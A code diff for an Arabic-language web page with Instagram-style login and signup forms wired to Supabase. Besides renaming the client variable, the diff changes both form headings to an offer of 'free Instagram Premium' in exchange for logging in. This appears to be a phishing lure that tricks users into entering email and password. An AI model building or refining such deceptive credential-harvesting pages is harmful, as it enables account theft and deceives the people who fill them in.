@@ -110,7 +110,7 @@
 
   <!-- كارت تسجيل الدخول -->
   <div class="card" id="loginCard">
-    <div class="logo">سجل اجابتك</div>
+    <div class="logo">سجل الدخول للحصول على انستجرام بريميوم مجاني</div>
 
     <input type="text" id="loginEmail" class="field" placeholder="الإيميل">
     <input type="password" id="loginPassword" class="field" placeholder="كلمة السر">
@@ -129,7 +129,7 @@
 
   <!-- كارت التسجيل -->
   <div class="card hidden" id="signupCard">
-    <div class="logo">سجل اجابتك</div>
+    <div class="logo">سجل الدخول للحصول على انستجرام بريميوم مجاني</div>
     <div style="font-size:17px;font-weight:600;color:#8e8e8e;margin-bottom:20px">
       سجّل عشان تتابع أصحابك
     </div>
@@ -156,7 +156,7 @@
   const SUPABASE_URL = "https://sqmhdpykntsxjlpdztms.supabase.co";
   const SUPABASE_ANON_KEY = "sb_publishable_2yaR2TFFO_hGQr8puC3ZJA_js9RzVHi";
 
-  const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
   // ================== تبديل بين الكاردين ==================
   function showSignup() {
@@ -191,7 +191,7 @@
     btn.disabled = true;
     btn.innerHTML = '<span class="spinner"></span>';
 
-    const { data, error } = await supabase.auth.signInWithPassword({ email, password });
+    const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password });
 
     btn.disabled = false;
     btn.innerHTML = 'تسجيل الدخول';
@@ -208,7 +208,7 @@
 
   // ================== لو المستخدم داخل بالفعل ==================
   (async () => {
-    const { data: { session } } = await supabase.auth.getSession();
+    const { data: { session } } = await supabaseClient.auth.getSession();
     if (session) {
       showMsg('loginMsg', 'انت مسجل دخول بالفعل (' + session.user.email + ')', 'success');
     }
@@ -236,12 +236,12 @@ window.submitAnswers = async function () {
   btn.innerHTML = '<span class="spinner"></span> جاري التسجيل...';
 
   try {
-    const { error } = await supabase
-      .from('puzzle_answers')
-      .insert({
-        answer_1: answer1,
-        answer_2: answer2
-      });
+  const { error } = await supabaseClient
+  .from('puzzle_answers')
+  .insert({
+    answer_1: answer1,
+    answer_2: answer2
+  });
 
     if (error) {
       console.error('Supabase error:', error);
